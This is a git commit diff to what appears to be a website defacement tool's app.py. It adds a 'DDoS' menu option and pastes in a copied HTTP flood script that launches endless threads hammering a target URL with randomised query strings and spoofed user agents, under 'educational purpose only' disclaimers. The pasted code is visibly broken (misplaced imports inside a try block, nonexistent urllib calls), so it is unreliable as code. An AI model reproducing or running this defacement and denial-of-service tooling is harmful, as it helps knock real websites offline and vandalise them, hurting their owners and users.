8352ec75927048f701c7284ed3caeabbfe570612
GULPGULP <115177023+GULPGULP@users.noreply.github.com>
2023-08-17 00:48:31 +0200

    Update app.py

--- app.py
+++ app.py
@@ -124,13 +124,14 @@ def main(__bn__):
     print(__bn__)
     while True:
         try:
-            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. Quit\n")
+            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. DDoS\n4. Quit\n")
             if choice == "1":
                 deface_single_site()
             elif choice == "2":
                 crawl_and_deface_links()
             elif choice == "3":
-                print("Goodbye!")
+                ddos()
+            elif choice == "4":
                 exit()
             else:
                 print("Invalid option, please try again.")
@@ -158,6 +159,108 @@ def crawl_and_deface_links():
         crawl_and_deface_links_from_file(a, links_file)
     except KeyboardInterrupt:
         print()
+
+def ddos():
+    try:
+        import os
+import sys
+import urllib.request
+import urllib.error
+import threading
+import random
+
+########################################
+# Educational purpose only             #
+########################################
+# I'm not responsible for your actions #
+########################################
+
+"""
+Created By: TheTechHacker
+--------------------------------------------------
+This Tool is for Educational purpose only             
+I'm not responsible for your actions 
+
+
+SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ
+"""
+
+
+if sys.platform == "linux" or sys.platform == "linux2":
+    os.system("clear")
+elif sys.platform == "win32":
+    os.system("cls")
+
+
+print("\033[1;32m")
+url = input("          URL:  ").strip()
+print("\033[1;m")
+
+count = 0
+headers = []
+referer = {
+    "https://duckduckgo.com/",
+    "https://www.google.com/",
+    "https://www.youtube.com"
+}
+
+
+def useragent():
+    global headers
+    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
+    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
+
+    return headers
+
+
+def ascii(size):
+    out_str = ''
+
+    for e in range(0, size):
+        code = random.randint(65, 90)
+        out_str += chr(code)
+    
+    return out_str
+
+
+class httpth1(threading.Thread):
+    def run(self):
+        global count
+        while True:
+            try:
+                #print ("\033[1;32m Attacking Website \033[1;m")
+                req = urllib.Request(url + "?" + ascii(random.randint(3, 10)))
+                #req = urllib2.Request(url)
+                req.add_header("User-Agent", random.choice(useragent()))
+                #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
+                req.add_header("Referer", referer)
+                urllib.urlopen(req)
+                count += 1
+                print ("{0} Pure Dos Send".format(count))
+            except urllib.HTTPError:
+                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
+                pass
+            except urllib.URLError:
+                print ("\033[1;34m URLERROR \033[1;m")
+                sys.exit()
+            except ValueError:
+                print ("\033[1;34m [-]Check You're URL \033[1;m")
+                sys.exit()
+            except KeyboardInterrupt:
+                exit("\033[1;34m [-]Canceled By User \033[1;m")
+                sys.exit()
+
+
+while True:
+    try:
+        th1 = httpth1()
+        th1.start()
+    except Exception:
+        pass
+    except KeyboardInterrupt:
+        exit("\033[1;34m [-]Canceled By User \033[1;m")
 
 if __name__ == "__main__":
     main(banner)
